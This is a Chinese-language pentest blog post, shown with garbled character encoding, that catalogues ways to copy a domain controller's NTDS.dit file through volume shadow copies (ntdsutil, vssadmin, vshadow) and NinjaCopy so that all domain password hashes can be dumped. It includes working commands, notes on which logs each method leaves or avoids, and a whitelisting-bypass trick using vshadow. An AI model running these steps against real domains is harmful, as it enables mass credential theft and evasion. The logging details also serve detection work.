I"1<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¹‹å‰çš„æ–‡ç« ã€Šå¯¼å‡ºå½“å‰åŸŸå†…æ‰€æœ‰ç”¨æˆ·hashçš„æŠ€æœ¯æ•´ç†ã€‹æ›¾ä»‹ç»è¿‡é€šè¿‡Volume Shadow Copyå®ç°å¯¹ntds.ditæ–‡ä»¶çš„å¤åˆ¶ï¼Œ å¯ç”¨æ¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·hashã€‚æœ¬æ–‡å°†å°è¯•åšç³»ç»Ÿæ€»ç»“ï¼Œæ€»ç»“å¤šç§ä¸åŒçš„æ–¹æ³•ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>å¤šç§å®ç°æ–¹æ³•</li>
  <li>æ¯”è¾ƒä¼˜ç¼ºç‚¹</li>
</ul>

<h2 id="0x02-é€šè¿‡volume-shadow-copyè·å¾—åŸŸæ§æœåŠ¡å™¨ntdsditæ–‡ä»¶">0x02 é€šè¿‡Volume Shadow Copyè·å¾—åŸŸæ§æœåŠ¡å™¨NTDS.ditæ–‡ä»¶</h2>
<hr />

<p>æµ‹è¯•ç³»ç»Ÿï¼š</p>

<ul>
  <li>Server 2008 R2 x64</li>
  <li>Server 2012 R2 x64</li>
</ul>

<p><strong>Volume Shadow Copy Serviceï¼š</strong></p>

<ul>
  <li>ç”¨äºæ•°æ®å¤‡ä»½</li>
  <li>æ”¯æŒWindows Server 2003 åŠä»¥ä¸Šæ“ä½œç³»ç»Ÿ</li>
  <li>ç³»ç»Ÿé»˜è®¤åœ¨ç‰¹å®šæ¡ä»¶ä¸‹è‡ªåŠ¨åˆ›å»ºæ•°æ®å¤‡ä»½ï¼Œå¦‚è¡¥ä¸å®‰è£…åã€‚åœ¨Win7ç³»ç»Ÿå¤§æ¦‚æ¯éš”ä¸€å‘¨è‡ªåŠ¨åˆ›å»ºå¤‡ä»½ï¼Œè¯¥æ—¶é—´æ— æ³•ç¡®å®š</li>
  <li>ç¦ç”¨VSSä¼šå½±å“ç³»ç»Ÿæ­£å¸¸ä½¿ç”¨ï¼Œå¦‚ System Restoreå’Œ Windows Server Backup</li>
</ul>

<h3 id="1ntdsutil">1ã€ntdsutil</h3>

<p>åŸŸç¯å¢ƒé»˜è®¤å®‰è£…</p>

<p>æ”¯æŒç³»ç»Ÿï¼š</p>

<ul>
  <li>Server 2003</li>
  <li>Server 2008</li>
  <li>Server 2012</li>
  <li>â€¦</li>
</ul>

<h4 id="å¸¸ç”¨å‘½ä»¤">å¸¸ç”¨å‘½ä»¤ï¼š</h4>

<p>(1) æŸ¥è¯¢å½“å‰å¿«ç…§åˆ—è¡¨</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List All" quit quit
</code></pre></div></div>

<p>(2) æŸ¥è¯¢å·²æŒ‚è½½çš„å¿«ç…§åˆ—è¡¨</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List Mounted" quit quit
</code></pre></div></div>

<p>(3) åˆ›å»ºå¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
</code></pre></div></div>

<p>(4) æŒ‚è½½å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "mount GUID" quit quit
</code></pre></div></div>

<p>(5) å¸è½½å¿«ç…§:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "unmount GUID" quit quit
</code></pre></div></div>

<p>(6) åˆ é™¤å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "delete GUID" quit quit
</code></pre></div></div>

<h4 id="å®é™…æµ‹è¯•">å®é™…æµ‹è¯•ï¼š</h4>

<p>(1) æŸ¥è¯¢å½“å‰ç³»ç»Ÿçš„å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "List All" quit quit
ntdsutil snapshot "List Mounted" quit quit
</code></pre></div></div>

<p>(2) åˆ›å»ºå¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "activate instance ntds" create quit quit
</code></pre></div></div>

<p>guidä¸º<code class="language-plaintext highlighter-rouge">{6e31c0ab-c517-420b-845d-c38acbf77ab9}</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-1.png" alt="Alt text" /></p>

<p>(3) æŒ‚è½½å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot "mount {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
</code></pre></div></div>

<p>å¿«ç…§æŒ‚è½½ä¸º<code class="language-plaintext highlighter-rouge">C:\$SNAP_201802270645_VOLUMEC$\</code>ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-2.png" alt="Alt text" /></p>

<p>(4) å¤åˆ¶ntds.dit</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy C:\$SNAP_201802270645_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit
</code></pre></div></div>

<p>(5) å¸è½½å¿«ç…§:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot  "unmount {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
</code></pre></div></div>

<p>(6) åˆ é™¤å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntdsutil snapshot  "delete {6e31c0ab-c517-420b-845d-c38acbf77ab9}" quit quit
</code></pre></div></div>

<h3 id="2vssadmin">2ã€vssadmin</h3>

<p>åŸŸç¯å¢ƒé»˜è®¤å®‰è£…</p>

<p>æ”¯æŒç³»ç»Ÿï¼š</p>

<ul>
  <li>Server 2008</li>
  <li>Server 2012</li>
  <li>â€¦</li>
</ul>

<h4 id="å¸¸ç”¨å‘½ä»¤-1">å¸¸ç”¨å‘½ä»¤ï¼š</h4>

<p>(1) æŸ¥è¯¢å½“å‰ç³»ç»Ÿçš„å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
</code></pre></div></div>

<p>(2) åˆ›å»ºå¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for=c:
</code></pre></div></div>

<p>(3) åˆ é™¤å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /for=c: /quiet
</code></pre></div></div>

<h4 id="å®é™…æµ‹è¯•-1">å®é™…æµ‹è¯•ï¼š</h4>

<p>(1) æŸ¥è¯¢å½“å‰ç³»ç»Ÿçš„å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
</code></pre></div></div>

<p>(2) åˆ›å»ºå¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin create shadow /for=c:
</code></pre></div></div>

<p>è·å¾—Shadow Copy Volume Nameä¸º<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-3.png" alt="Alt text" /></p>

<p>(3) å¤åˆ¶ntds.dit</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\windows\NTDS\ntds.dit c:\ntds.dit
</code></pre></div></div>

<p>(4) åˆ é™¤å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin delete shadows /for=c: /quiet
</code></pre></div></div>

<h3 id="3vshadowexe">3ã€vshadow.exe</h3>

<p>ç³»ç»Ÿé»˜è®¤ä¸æ”¯æŒ,ï¼Œå¯åœ¨Microsoft Windows Software Development Kit (SDK)ä¸­è·å¾—è¯¥å·¥å…·</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>64ä½ç³»ç»Ÿéœ€è¦ä½¿ç”¨64ä½çš„vshadow.exe</p>

<p>ä¸åŒç³»ç»Ÿå¯ä¾›ä½¿ç”¨çš„vshadow.exeä¸‹è½½åœ°å€ï¼š</p>

<p>http://edgylogic.com/blog/vshadow-exe-versions/</p>

<h4 id="å¸¸ç”¨å‘½ä»¤-2">å¸¸ç”¨å‘½ä»¤ï¼š</h4>

<p>(1) æŸ¥è¯¢å½“å‰ç³»ç»Ÿçš„å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -q
</code></pre></div></div>

<p>(2) åˆ›å»ºå¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -p -nw C:
</code></pre></div></div>

<p>å‚æ•°è¯´æ˜ï¼š</p>

<p>-p persistentï¼Œå¤‡ä»½æ“ä½œæˆ–æ˜¯é‡å¯ç³»ç»Ÿä¸ä¼šåˆ é™¤</p>

<p>-nw no writersï¼Œç”¨æ¥æé«˜åˆ›å»ºé€Ÿåº¦</p>

<p>C: å¯¹åº”cç›˜</p>

<p>(3) åˆ é™¤å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -dx=ShadowCopySetId

vshadow -ds=ShadowCopyId
</code></pre></div></div>

<h4 id="å®é™…æµ‹è¯•-2">å®é™…æµ‹è¯•ï¼š</h4>

<p>(1) æŸ¥è¯¢å½“å‰ç³»ç»Ÿçš„å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -q
</code></pre></div></div>

<p>(2) åˆ›å»ºå¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -p -nw C:
</code></pre></div></div>

<p>è·å¾—SnapshotSetIDä¸º<code class="language-plaintext highlighter-rouge">{809b77cc-cf9a-4101-b802-08e97d10e613}</code></p>

<p>è·å¾—SnapshotIDä¸º<code class="language-plaintext highlighter-rouge">{ef99d039-9a38-4e8b-9f57-e3113d464f76}</code></p>

<p>è·å¾—Shadow copy device nameä¸º<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-4.png" alt="Alt text" /></p>

<p>(3) å¤åˆ¶ntds.dit</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy10\windows\NTDS\ntds.dit c:\ntds.dit
</code></pre></div></div>

<p>(4) åˆ é™¤å¿«ç…§</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -dx={809b77cc-cf9a-4101-b802-08e97d10e613}
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow -ds={ef99d039-9a38-4e8b-9f57-e3113d464f76}
</code></pre></div></div>

<h3 id="4vssownvbs">4ã€vssown.vbs</h3>

<p>å¯ä¾›å‚è€ƒçš„ä¸‹è½½åœ°å€ï¼š</p>

<p>https://raw.githubusercontent.com/borigue/ptscripts/master/windows/vssown.vbs</p>

<p>æœ¬è´¨ä¸Šæ˜¯é€šè¿‡wmiå¯¹ShadowCopyè¿›è¡Œæ“ä½œ</p>

<p>é€šè¿‡wmiæŸ¥è¯¢å¿«ç…§ä¿¡æ¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_ShadowCopy GET DeviceObject,ID,InstallDate /FORMAT:list
</code></pre></div></div>

<p>powershellå®ç°ï¼š</p>

<p>https://github.com/samratashok/nishang/blob/master/Gather/Copy-VSS.ps1</p>

<h3 id="æ‰©å±•">æ‰©å±•</h3>

<h4 id="1æ—¥å¿—æ–‡ä»¶">1ã€æ—¥å¿—æ–‡ä»¶</h4>

<p>è°ƒç”¨Volume Shadow CopyæœåŠ¡ä¼šäº§ç”Ÿæ—¥å¿—æ–‡ä»¶ï¼Œä½äºSystemä¸‹ï¼ŒEvent IDä¸º7036</p>

<p>æ‰§è¡Œ<code class="language-plaintext highlighter-rouge">ntdsutil snapshot "activate instance ntds" create quit quit</code>ä¼šé¢å¤–äº§ç”ŸEvent IDä¸º98çš„æ—¥å¿—æ–‡ä»¶</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-5.png" alt="Alt text" /></p>

<h4 id="2è®¿é—®å¿«ç…§ä¸­çš„æ–‡ä»¶">2ã€è®¿é—®å¿«ç…§ä¸­çš„æ–‡ä»¶</h4>

<p>æŸ¥çœ‹å¿«ç…§åˆ—è¡¨ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vssadmin list shadows
</code></pre></div></div>

<p>æ— æ³•ç›´æ¥è®¿é—®<code class="language-plaintext highlighter-rouge">\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12</code>ä¸­çš„æ–‡ä»¶</p>

<p>å¯é€šè¿‡åˆ›å»ºç¬¦å·é“¾æ¥è®¿é—®å¿«ç…§ä¸­çš„æ–‡ä»¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mklink /d c:\testvsc \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy12\
</code></pre></div></div>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-2-27/2-6.png" alt="Alt text" /></p>

<p>åˆ é™¤ç¬¦å·é“¾æ¥ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rd c:\testvsc
</code></pre></div></div>

<p>åˆ©ç”¨æ€è·¯ï¼š</p>

<p>å¦‚æœå½“å‰ç³»ç»Ÿå­˜åœ¨å¿«ç…§æ–‡ä»¶ï¼Œå¯å¯¹ç³»ç»Ÿçš„å†å²æ–‡ä»¶è¿›è¡Œè®¿é—®</p>

<h4 id="3åˆ©ç”¨vshadowæ‰§è¡Œå‘½ä»¤">3ã€åˆ©ç”¨vshadowæ‰§è¡Œå‘½ä»¤</h4>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://bohops.com/2018/02/10/vshadow-abusing-the-volume-shadow-service-for-evasion-persistence-and-active-directory-database-extraction/</p>

<p>æ‰§è¡Œå‘½ä»¤ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vshadow.exe -nw -exec=c:\windows\system32\notepad.exe c:
</code></pre></div></div>

<p>æ‰§è¡Œåï¼Œåå°å­˜åœ¨è¿›ç¨‹VSSVC.exeï¼ŒåŒæ—¶æ˜¾ç¤ºæœåŠ¡Volume Shadow Copyæ­£åœ¨è¿è¡Œï¼Œéœ€è¦æ‰‹åŠ¨å…³é—­è¿›ç¨‹VSSVC.exe</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æ‰‹åŠ¨å…³é—­è¿›ç¨‹VSSVC.exeä¼šç”Ÿæˆæ—¥å¿—7034</p>

<p>åˆ©ç”¨æ€è·¯ï¼š</p>

<p>vshadow.exeåŒ…å«å¾®è½¯ç­¾åï¼Œèƒ½ç»•è¿‡æŸäº›ç™½åå•çš„é™åˆ¶ã€‚å¦‚æœä½œä¸ºå¯åŠ¨é¡¹ï¼ŒAutorunsçš„é»˜è®¤å¯åŠ¨åˆ—è¡¨ä¸æ˜¾ç¤º</p>

<h2 id="0x03-é€šè¿‡ninjacopyè·å¾—åŸŸæ§æœåŠ¡å™¨ntdsditæ–‡ä»¶">0x03 é€šè¿‡NinjaCopyè·å¾—åŸŸæ§æœåŠ¡å™¨NTDS.ditæ–‡ä»¶</h2>
<hr />

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1</p>

<p>æ²¡æœ‰è°ƒç”¨Volume Shadow CopyæœåŠ¡ï¼Œæ‰€ä»¥ä¸ä¼šäº§ç”Ÿæ—¥å¿—æ–‡ä»¶7036</p>

<h2 id="0x04-å°ç»“">0x04 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡æ•´ç†äº†å¤šç§è·å¾—åŸŸæ§æœåŠ¡å™¨NTDS.ditæ–‡ä»¶çš„æ–¹æ³•ï¼Œæµ‹è¯•ä½¿ç”¨ç¯å¢ƒï¼Œæ¯”è¾ƒä¼˜ç¼ºç‚¹ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET